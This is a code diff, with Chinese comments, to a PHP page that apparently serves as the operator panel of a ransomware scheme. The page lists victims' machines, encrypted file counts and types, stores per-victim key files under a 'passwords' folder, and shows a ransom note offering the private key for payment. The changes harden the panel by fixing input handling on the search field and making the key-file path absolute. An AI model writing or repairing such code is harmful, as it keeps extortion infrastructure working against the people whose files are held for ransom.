@@ -6,7 +6,8 @@ include __DIR__ . '/database/db_conection.php';
 
 $records_per_page = 10;
 $pageno = max(1, intval($_GET['pageno'] ?? 1));
-$search = trim($_GET['search'] ?? '');
+// get_str：`search[]=x` 传数组会让 trim 抛 TypeError → 500
+$search = trim(get_str('search'));
 $offset = ($pageno - 1) * $records_per_page;
 
 if ($search !== '') {
@@ -182,7 +183,8 @@ Contact us to obtain the private key and restore your files.</textarea>
   $su=preg_replace('/[^a-zA-Z0-9_\\-]/','_',$row['computer_user']);
   $ss=preg_replace('/[^a-zA-Z0-9_\\-]/','_',$row['systemid']);
   $nt=date("H-i-s",strtotime($row['time']));
-  $fp='passwords/'.$sm.'_'.$su.'/'.$nt.'_'.$ss.'.flora';
+  // 绝对路径：相对路径要靠 Apache 的 CWD 才对，是隐藏的脆弱点
+  $fp=__DIR__.'/passwords/'.$sm.'_'.$su.'/'.$nt.'_'.$ss.'.flora';
   $ec=intval($row['encrypted_count']??0);
   $es=intval($row['encrypted_size']??0);
   $et=h($row['encrypted_types']??'');
